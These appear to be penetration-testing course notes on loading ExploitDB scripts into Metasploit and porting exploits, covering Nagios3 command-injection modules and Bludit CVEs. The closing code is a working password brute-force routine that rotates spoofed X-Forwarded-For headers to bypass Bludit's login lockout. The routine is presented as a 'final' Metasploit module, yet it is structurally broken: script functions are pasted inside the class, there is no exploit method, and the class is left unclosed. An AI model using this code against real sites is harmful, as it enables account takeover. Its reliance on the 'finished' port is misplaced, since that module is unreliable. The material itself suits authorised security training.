To install any new Metasploit modules which have already been ported over by other users, one can choose to update their `msfconsole` from the terminal, which will ensure that all newest exploits, auxiliaries, and features will be installed in the latest version of `msfconsole`.

[ExploitDB](https://www.exploit-db.com) is a great choice when searching for a custom exploit. We can use tags to search through the different exploitation scenarios for each available script. One of these tags is [Metasploit Framework (MSF)](https://www.exploit-db.com/?tag=3), which, if selected, will display only scripts that are also available in Metasploit module format.

- Files ending with `.rb` are Ruby scripts, often designed specifically for use within `msfconsole`.
- Filtering by `.rb` extension helps exclude scripts that cannot run inside Metasploit.
- Not all `.rb` files are valid Metasploit modules; some are standalone Ruby exploits without Metasploit-compatible code.
- An example of such a non-module `.rb` script will be examined next.

```bash
OathBornX@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"

---------------------------------------------------------------------------------------------------
 Exploit Title                                                    |  Path
---------------------------------------------------------------------------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)       | linux/remote/24159.rb
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)   | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)          | unix/webapps/9861.rb
---------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

We have to download the `.rb` file and place it in the correct directory. The default directory where all the modules, scripts, plugins, and `msfconsole` proprietary files are stored is `/usr/share/metasploit-framework`. The critical folders are also symlinked in our home and root folders in the hidden `~/.msf4/` location.

#### MSF - Directory Structure

```bash
OathBornX@htb[/htb]$ ls /usr/share/metasploit-framework/

app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools
```

```bash
OathBornX@htb[/htb]$ ls .msf4/

history  local  logos  logs  loot  modules  plugins  store
```

After downloading an exploit, copy it into the correct module directory so that `msfconsole` can recognize it. Your home folder’s `.msf4` may lack the full folder structure found in `/usr/share/metasploit-framework/`, so create missing folders to mirror the original hierarchy. Place the `.rb` script in the proper location. Follow strict naming conventions: use `snake_case` with only alphanumeric characters and underscores, avoid dashes, to prevent loading errors.

#### MSF - Loading Additional Modules at Runtime

```bash
OathBornX@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
OathBornX@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```

#### MSF - Loading Additional Modules

```bash
msf6> loadpath /usr/share/metasploit-framework/modules/
```

Alternatively, we can also launch `msfconsole` and run the `reload_all` command for the newly installed module to appear in the list. After the command is run and no errors are reported, try either the `search [name]` function inside `msfconsole` or directly with the `use [module-path]` to jump straight into the newly installed module.

Writing and Importing Modules

```bash
msf6 > reload_all
msf6 > use exploit/unix/webapp/nagios3_command_injection 
msf6 exploit(unix/webapp/nagios3_command_injection) > show options

Module options (exploit/unix/webapp/nagios3_command_injection):

   Name     Current Setting                 Required  Description
   ----     ---------------                 --------  -----------
   PASS     guest                           yes       The password to authenticate with
   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80                              yes       The target port (TCP)
   SSL      false                           no        Negotiate SSL/TLS for outgoing connections
   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi
   USER     guest                           yes       The username to authenticate with
   VHOST                                    no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

---

# Porting Over Scripts into Metasploit Modules

To adapt a custom Python, PHP, or other exploit script into a Metasploit Ruby module, learning `Ruby` is essential. `Metasploit` modules require `hard tabs` for indentation. You don’t need to start from scratch—select an existing `exploit` module in the relevant category and repurpose it as a `boilerplate` for your port-over. Keeping custom modules organized ensures a clean environment for you and other `pentesters`.

For example, to port the `Bludit` 3.9.2 Authentication Bruteforce Mitigation Bypass `exploit`, download the script `48746.rb` and copy it to `/usr/share/metasploit-framework/modules/exploits/linux/http/`. Starting `msfconsole` now will show only one `Bludit` `exploit` in that folder, confirming your new `exploit` isn’t loaded yet. This is beneficial since the existing `Bludit` `exploit` in that folder serves as a `boilerplate` for your new module.

---
# Writing the Module

Custom proprietary networks often resist existing `Metasploit` modules and `scanners`, making `Ruby` coding essential to create tailored modules for these environments. The `Metasploit` documentation provides comprehensive guidance on writing `Ruby` modules, including `scanners`, `auxiliary` tools, and `exploits`—whether custom-built or ported. Developing `Ruby` skills for `Metasploit` significantly enhances assessment capabilities. For reference, the `Bludit` Directory Traversal Image File Upload `exploit` included in `msfconsole` serves as a solid `boilerplate`. This module outlines multiple fields before the `exploit` proof-of-concept (POC) code, which must be adapted when porting your own `exploit`. The unmodified code snapshot demonstrates the standard structure to follow when building new `modules`.

#### Proof-of-Concept - Requirements

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::Report
```

We can look at the `include` statements to see what each one does. This can be done by cross-referencing them with the [Metasploit documentation](https://docs.metasploit.com/api/). Below are their respective functions as explained in the documentation:

|**Function**|**Description**|
|---|---|
|`Msf::Exploit::Remote::HttpClient`|This module provides methods for acting as an HTTP client when exploiting an HTTP server.|
|`Msf::Exploit::PhpEXE`|This is a method for generating a first-stage php payload.|
|`Msf::Exploit::FileDropper`|This method transfers files and handles file clean-up after a session with the target is established.|
|`Msf::Auxiliary::Report`|This module provides methods for reporting data to the MSF DB.|

Looking at their purposes above, we conclude that we will not need the FileDropper method, and we can drop it from the final module code.

We see that there are different sections dedicated to the `info` page of the module, the `options` section. We fill them in appropriately, offering the credit due to the individuals who discovered the exploit, the CVE information, and other relevant details.

#### Proof-of-Concept - Module Information

```ruby
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid
        parameter in the image upload feature in order to save a malicious payload anywhere
        onto the server, and then use a custom .htaccess file to bypass the file extension
        check to finally get remote code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'christasa', # Original discovery
          'sinn3r'     # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-16113'],
          ['URL', 'https://github.com/bludit/bludit/issues/1081'],
          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-09-07",
      'DefaultTarget'  => 0))
```

After the general identification information is filled in, we can move over to the `options` menu variables:
#### Proof-of-Concept - Functions

```ruby
 register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])
      ])
  end
```

Looking back at our exploit, we see that a wordlist will be required instead of the `BLUDITPASS` variable for the module to brute-force the passwords for the same username. It would look something like the following snippet:

```ruby
OptPath.new('PASSWORDS', [ true, 'The list of passwords',
          File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
```

The rest of the exploit code needs to be adjusted according to the classes, methods, and variables used in the porting to the Metasploit Framework for the module to work in the end. The final version of the module would look like this:
#### Proof-of-Concept

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
      'Description'    => %q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rastating', # Original discovery
          '0ne-nine9'  # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-17240'],
          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-10-05",
      'DefaultTarget'  => 0))
      
     register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
        	File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
      ])
  end
  
  # -- Exploit code -- #
  # dirty workaround to remove this warning:
#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
# see https://github.com/nahi/httpclient/issues/252
class WebAgent
  class Cookie < HTTP::Cookie
    def domain
      self.original_domain
    end
  end
end

def get_csrf(client, login_url)
  res = client.get(login_url)
  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
end

def auth_ok?(res)
  HTTP::Status.redirect?(res.code) &&
    %r{/admin/dashboard}.match?(res.headers['Location'])
end

def bruteforce_auth(client, host, username, wordlist)
  login_url = host + '/admin/login'
  File.foreach(wordlist).with_index do |password, i|
    password = password.chomp
    csrf_token = get_csrf(client, login_url)
    headers = {
      'X-Forwarded-For' => "#{i}-#{password[..4]}",
    }
    data = {
      'tokenCSRF' => csrf_token,
      'username' => username,
      'password' => password,
    }
    puts "[*] Trying password: #{password}"
    auth_res = client.post(login_url, data, headers)
    if auth_ok?(auth_res)
      puts "\n[+] Password found: #{password}"
      break
    end
  end
end

#begin
#  args = Docopt.docopt(doc)
#  pp args if args['--debug']
#
#  clnt = HTTPClient.new
#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])
#rescue Docopt::Exit => e
#  puts e.message
#end
```

